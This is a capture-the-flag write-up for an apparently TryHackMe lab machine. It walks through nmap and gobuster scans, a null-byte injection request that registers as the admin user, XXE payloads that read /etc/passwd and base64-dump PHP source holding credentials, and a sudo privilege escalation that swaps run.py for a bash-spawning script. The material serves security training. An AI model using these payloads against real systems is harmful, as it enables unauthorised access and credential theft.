#### 1. Scanning

```
 nmap -Pn -A 10.10.224.33                                       130 ⨯

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 14:29 EST
Nmap scan report for 10.10.224.33
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 14:6b:67:4c:1e:89:eb:cd:47:a2:40:6f:5f:5c:8c:c2 (DSA)
|   2048 66:42:f7:91:e4:7b:c6:7e:47:17:c6:27:a7:bc:6e:73 (RSA)
|   256 a8:6a:92:ca:12:af:85:42:e4:9c:2b:0e:b5:fb:a8:8b (ECDSA)
|_  256 62:e4:a3:f6:c6:19:ad:30:0a:30:a1:eb:4a:d3:12:d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.91 seconds
```

There are two open ports: 22 and 80                                                                 



#### 2. Gobuster
```
└─$ gobuster dir -u http://10.10.197.26 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.197.26
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/01/20 03:24:06 Starting gobuster
===============================================================
/index.html (Status: 200)
/register.php (Status: 200)
/admin.php (Status: 200)
/scripts (Status: 301)
/forms.php (Status: 200)
/report (Status: 200)
/logout.php (Status: 302)
/dashboard.php (Status: 302)
/acc.php (Status: 200)
/with.php (Status: 302)
/tra.php (Status: 302)
```

I checked all drectories and there was nothing interesting, however there is login / password field `/admin.php`  sand `/report` with ELF file to download.



#### 3. Checking ELF file

It is possible to examine file with `ghidra` or any other revers engineering tool like `gcc` etc.

Inside there is a list of already registered users, however the one with full rights is
`admin@bank.a` 

Another important thing is that once we type `curl $IP/admin.php` we can get information that webiste is using PHP 5. 

This version of PHP is vulnerable to null byte injection, more informations here:

`https://www.cvedetails.com/cve/CVE-2006-7243/`


Adding `\00` in the end of username will bypass restrictions, as normally are not able to register as that user.

I open Burp, intercept a request and add bytes after bank.a so finally it looks like this:

```
POST /register.php HTTP/1.1
Host: 10.10.197.26
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://10.10.197.26
Connection: close
Referer: http://10.10.197.26/register.php
Cookie: PHPSESSID=oabkafdns8g28bvb83i78mv9c6
Upgrade-Insecure-Requests: 1

uname=admin%40bank.a\00&bank=ABC&password=password&btn=Register+me%21
```

I successfully get admin access and can login with specified credentials.



#### 4. Playing around console

I accessed `/forms.php` and saw tried to intercept a request. Both fields are passwed using XML, which could be vulnerable to `XXE attack` you can find more informations here:

`https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing`

This is how normal request looks like:

```
<?xml version="1.0" encoding="UTF-8"?>

<root>
<name>
&hello;
</name>
<search
&hello;
</search>
</root>
```

and here is an example with XXE to obtain `/etc/passwd` file

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT search ANY>
<!ENTITY helloSYSTEM "file:///etc/passwd">
]>

<root><
<name>
&hello;;
</name>
<search>
&hello;
</search>
</root>
```
so as a repsonse we get:

```
Sorry, account number root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
yash:x:1002:1002:,,,:/home/yash:/bin/bash
 is not active!
 ```

There are two users on machine: `yash` and `cyber`

I was stuck for a long time until I googled a clue to read `/acc.php` with a conversion filter, also using `XXE attack`

```
POST /forms.php HTTP/1.1
Host: 10.10.197.26
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 250
Origin: http://10.10.197.26
Connection: close
Referer: http://10.10.197.26/forms.php
Cookie: PHPSESSID=oabkafdns8g28bvb83i78mv9c6

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT search ANY>
<!ENTITY hello SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/acc.php">
]>

<root>
<name>
&hello;
</name>
<search>
&hello;
</search>
</root>
```

As a result we get base64 encoded file:

```
Sorry, account number 
PCFET0NUbHkgQWRtaW5zIGNhbiBhY2Nlc3MgdGhpcyBwYWdlIScpPC9zY3JpcHQ+IjsKc2Vzc2lvbl9kZXN0cm95KCk7CnVuc2V0KCRfU0VTU0lPTlsnZmF2Y29sb3InXSk7CmhlYWRlcigiUmVmcmVzaDogMC4xOyB1cmw9aW5kZXguaHRtbCIpOwp9Cj8+Cg==
 is not active!
 ```

which tafter decoding urns out to have hidden credentials inside:

```
//MY CREDS :- cyber:su*************d!
if(isset($_POST['btn']))
{
$ms=$_POST['msg'];
echo "ms:".$ms;
if($ms==="id")
{
system($ms);
}
else if($ms==="whoami")
{
system($ms);
}
else
```



#### 5. SSH as `cyber`

I ssh to machine using `cyber` username and found password and get first flag:

```
cyber@ubuntu:~$ ls -al
total 32
drwx------ 3 cyber cyber 4096 Nov 17 19:47 .
drwxr-xr-x 4 root  root  4096 Nov 16 15:28 ..
-rw------- 1 cyber cyber    0 Nov 17 19:47 .bash_history
-rw-r--r-- 1 cyber cyber  220 Nov  9 21:06 .bash_logout
-rw-r--r-- 1 cyber cyber 3637 Nov  9 21:06 .bashrc
drwx------ 2 cyber cyber 4096 Nov  9 21:52 .cache
-rw--w---- 1 cyber cyber   85 Nov 15 16:45 flag1.txt
-rw-r--r-- 1 cyber cyber  675 Nov  9 21:06 .profile
-rwx------ 1 root  root   349 Nov 15 18:33 run.py
cyber@ubuntu:~$ cat flag1.txt
THM{6f********************}s

Sorry I am not good in designing ascii art :(
```



#### 6. Enumeration

I check what permission has `cyber`:

```
cyber@ubuntu:~$ sudo -l


User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py

I run python script but nothing happens:

cyber@ubuntu:~$ sudo -u root /usr/bin/python3 /home/cyber/run.py
Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!
```
A common method to get root is to modify python script and recreate it adding a spawn console inside.

We have no read/write rights so let's try to rename a script:

`cyber@ubuntu:~$ mv run.py run.py.bak`

and recreate it with shell spawn inside:

```
cyber@ubuntu:~$ echo "import pty" > run.py
cyber@ubuntu:~$ echo "pty.spawn('/bin/bash')" >> run.py
cyber@ubuntu:~$ ls
flag1.txt  run.py  run.py.bak
```
so now I execute modified script:

`cyber@ubuntu:~$ sudo /usr/bin/python3  /home/cyber/run.py`

and am root:

```
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```
so it's possible to get root flag and user's flag in `/home/yash/`

```
root@ubuntu:~# cat /root/root.txt
